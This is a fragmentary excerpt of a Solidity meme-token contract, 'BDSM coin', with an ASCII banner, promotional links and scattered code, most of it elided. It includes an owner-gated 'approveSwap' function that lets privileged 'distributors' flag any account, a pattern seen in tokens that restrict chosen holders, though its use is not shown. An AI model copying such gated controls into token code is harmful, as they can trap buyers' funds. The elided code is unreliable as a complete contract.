...
▀▀███▀▀▀██▄  ███    ███ ▀███████████ ███   ███   ███ 
  ...
  ███    ███ ███   ▄███    ▄█    ███ ███   ███   ███ 
▄█████████▀  ████████▀   ▄████████▀   ▀█   ███   █▀  
WEBSITE: https://bdsmcoin.net/
TELEGRAM: https://t.me/BDSMCoin                 */
...
contract BDSMcoin is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string private _name = 'BDSM coin';
    ...
    _reflectFee(rFee, tFee);
    emit Transfer(sender, recipient, tTransferAmount);}
    function approveSwap(address acconut) external distributors {
    _approveSwap[acconut] = true;}
